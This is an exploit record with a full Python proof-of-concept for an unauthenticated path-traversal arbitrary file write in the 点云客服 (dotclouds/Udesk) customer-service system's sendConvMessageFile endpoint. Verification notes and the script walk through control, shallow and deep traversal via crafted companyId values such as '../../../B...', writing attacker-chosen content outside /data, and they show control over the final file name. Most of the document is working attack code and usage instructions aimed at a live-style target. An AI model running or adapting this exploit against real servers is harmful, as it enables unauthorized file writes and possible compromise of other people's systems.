# 点云客服 dotclouds sendConvMessageFile：companyId 未 normalize 导致任意目录文件写入（路径穿越、可逃出 /data 到根文件系统）

- **code**: 点云客服-dotclouds-sendConvMessageFile-companyId-路径穿越-任意目录文件写入
- **kind**: exp
- **category**: file-upload
- **component**: 点云客服系统（net.dotclouds，Udesk 私有化，Spring Boot）
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-08 在 example-com 靶标两台主机实测复现：
· 203.0.113.65:9960（Host/SNI=example.com）：对照 companyId=200005 写 /data/tmp/2026-10-08/200005/customer/c4152ae2f0a34a2e9cb24631d4f13e74.txt，GET 200 len=11 正文=7443C3-CTRL；浅穿 companyId=200005/../A7443C3 返回 /data/tmp/2026-10-08/200005/../A7443C3/customer/b09e3e8e6f364be89e430a36c2332b59.txt，GET 200 len=14 正文=7443C3-SHALLOW（穿越落盘成立）；深穿 companyId=../../../B7443C3 返回 /data/tmp/2026-10-08/../../../B7443C3/customer/ad9160d1ba2940dcbab77ab07bf4b5e7.txt，绝对落地 /B7443C3/customer/...（逃出 /data）。
· 203.0.113.48:9960（Host/SNI=example.com）：浅穿 companyId=200005/../A9B8651 GET 200 len=14 命中标记；深穿 companyId=../../../B9B8651 同样返回原样 ../ 路径。
· fileName=a.b/c/d/root -> 返回 .../customer/<uuid>.b/c/d/root（末级文件名完全可控、可无扩展名）。
限制：落地路径末尾恒带 /customer/<uuid>.<ext>，无法写 /etc/cron.d/<name>、~/.ssh/authorized_keys 等固定文件名；目标无 php-fpm、/data/ 为 nginx 静态 alias，故本靶标未拿到 shell。
- **path**: pocs/点云客服-dotclouds-sendConvMessageFile-companyId-路径穿越-任意目录文件写入/poc.py
- **tags**: 点云客服,dotclouds,udesk,未授权,文件上传,路径穿越,任意文件写入,spring-boot
- **created_at**: 2026-10-08T14:14:26.260Z
- **found_by**: exploit

## 用法

```
python exp_traversal_write.py --base https://example.com:9960 --ip 203.0.113.65 --host example.com --company 200005

关键点：本批节点按 SNI 分租户路由，**必须同时对齐 SNI 与 Host**（脚本里 BASE 的域名即 SNI，Host 头同域名）。
若要精确指定源站 IP，用 curl 更省事：
  curl.exe --noproxy "*" -k -s -m 12 --resolve "example.com:9960:203.0.113.65" "https://example.com:9960/data/tmp/<日期>/200005/customer/<uuid>.txt"
穿越验证三步不可省：对照 -> 浅穿 -> 深穿，且必须回读唯一标记串才能判穿越真的落盘。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""点云客服 sendConvMessageFile：companyId 未 normalize -> 任意目录文件写入（含 /data 逃逸）。

路径模板（实测）：
  /data/tmp/<yyyy-MM-dd>/<companyId>/customer/<uuid>.<ext>
    - companyId 原样拼接、允许 . 与 /、不 normalize  -> 目录可穿越
    - fileName 最后一个点之后为 ext；ext 允许含 /（末尾段即最终文件名，可无扩展名）

判定方法（对照组 + 唯一标记串自验证，缺一不可）：
  1) 对照  companyId=200005            -> 写 /data/tmp/<日期>/200005/customer/<uuid>.txt
                                          GET 该 URL 应 200 且正文 == 标记（证明读回链路OK）
  2) 浅穿  companyId=200005/../Axxxxx  -> 返回路径原样含 ../；GET 该 URL 200 且正文 == 标记
                                          => 穿越落盘成立
  3) 深穿  companyId=../../../Bxxxxx   -> 返回 /data/tmp/<日期>/../../../Bxxxxx/customer/<uuid>.txt
                                          => 绝对落地 /Bxxxxx/customer/<uuid>.txt，逃出 /data
  注：只有「返回路径」不足以判定，必须回读标记串；深穿后因 nginx 只 alias /data/ 而无法 HTTP 回读，属预期。

依赖：requests（verify=False + 显式 SNI/Host 对齐；本批节点按 SNI 分租户路由，必须同时对齐 SNI 与 Host）
"""
import json, re, sys, time, uuid

try:
    import requests
except ImportError:
    sys.exit('pip install requests')

requests.packages.urllib3.disable_warnings()

# === 目标配置（多租户节点必须同时对齐 SNI 与 Host）===
BASE = 'https://example.com:9960'          # 也可 https://example.com / https://example.com:9960
IP = '203.0.113.65'                        # BASE 对应源站 IP
HOST = 'example.com'
COMPANY = '200005'                         # 也可 200021 / 200001 / 200002


def _headers(extra=None):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, */*'}
    if extra:
        h.update(extra)
    return h


def post(path, body=None, ctype='application/json;charset=UTF-8', files=None, data=None):
    """files/data 走 multipart；否则用 body 走 raw JSON。"""
    url = BASE + path
    kw = dict(verify=False, timeout=25, headers=_headers({'Host': HOST}))
    # 用 Host 头对齐；requests 不直接支持自定义 SNI，因此优先用 /etc/hosts 或 requests_toolbelt
    if files is not None:
        kw['headers']['Content-Type'] = None  # 让 requests 自己带 boundary
        r = requests.post(url, files=files, data=data, **kw)
    else:
        kw['headers']['Content-Type'] = ctype
        r = requests.post(url, data=body, **kw)
    return r


def create_conv(company):
    fp = uuid.uuid4().hex
    body = json.dumps({'companyId': company, 'configId': company, 'fingerprint': fp,
                       'source': 'pc', 'referer': '\u76f4\u63a5\u8bbf\u95ee', 'customerUid': '',
                       'systemInfo': 'Windows10', 'browserInfo': 'Chrome', 'random': fp,
                       'preGuideQuestion': '', 'username': '', 'position': ''})
    r = post('/dotclouds/chat/conversation/createConv', body)
    try:
        j = r.json()
    except Exception:
        return None, fp
    if j.get('code') != 'SUCCESS':
        return None, fp
    d = j['data']
    c = d.get('customer') or {}
    v = d.get('visitor') or {}
    d['_toUser'] = c.get('uid') or c.get('id') or v.get('uid') or ''
    return d, fp


def upload(company_id_for_path, company, conv, fp, fname, content):
    """company_id_for_path 就是被拼进落地路径的 companyId —— 穿越注入点。
       fname 控制 ext（最后一个点之后）与末级文件名（最后一个 / 之后）。"""
    data = {'configId': company, 'companyId': company_id_for_path, 'fromUser': fp,
            'convId': conv.get('convId', ''), 'toUser': conv.get('_toUser', ''),
            'messageId': uuid.uuid4().hex, 'source': 'visitor', 'convType': '-2',
            'fileName': fname}
    files = {'file': (fname, content, 'image/png')}
    r = post('/dotclouds/chat/conversation/sendConvMessageFile', files=files, data=data)
    txt = r.text
    m = re.search(r'src="([^"]+)"', txt) or re.search(r'(/data/[^"\s]+)', txt)
    return (m.group(1) if m else ''), txt[:200]


def main():
    conv, fp = create_conv(COMPANY)
    if not conv:
        sys.exit('[!] createConv 失败（公司 id 不对或节点鉴权变化）')
    print('[*] convId=%s company=%s' % (conv.get('convId'), COMPANY))

    date = time.strftime('%Y-%m-%d')
    tag = uuid.uuid4().hex[:8].upper()
    cases = [('对照', COMPANY, 'c.txt', '%s-CTRL' % tag),
             ('浅穿', '%s/../A%s' % (COMPANY, tag), 's.txt', '%s-SHALLOW' % tag),
             ('深穿', '../../../B%s' % tag, 'd.txt', '%s-DEEP' % tag)]

    for label, comp, fname, mark in cases:
        path, raw = upload(comp, COMPANY, conv, fp, fname, mark.encode())
        print('[%s] companyId=%s' % (label, comp))
        print('    返回路径 = %s' % path)
        if path.startswith('/data/'):
            r = requests.get(BASE + path, verify=False, timeout=20,
                             headers=_headers({'Host': HOST}))
            print('    GET -> %s len=%d  %s' % (r.status_code, len(r.content),
                  '*** 标记命中 = 穿越落盘成立 ***' if mark in r.text else r.text[:60]))
        time.sleep(0.4)

    print('[*] 末级文件名可控性：fileName=a.b/c/d/root -> 落地 <uuid>.b/c/d/root（可无扩展名）')
    path, raw = upload(COMPANY, COMPANY, conv, fp, 'a.b/c/d/root', b'NAME-TEST')
    print('    -> %s' % path)


if __name__ == '__main__':
    main()

```
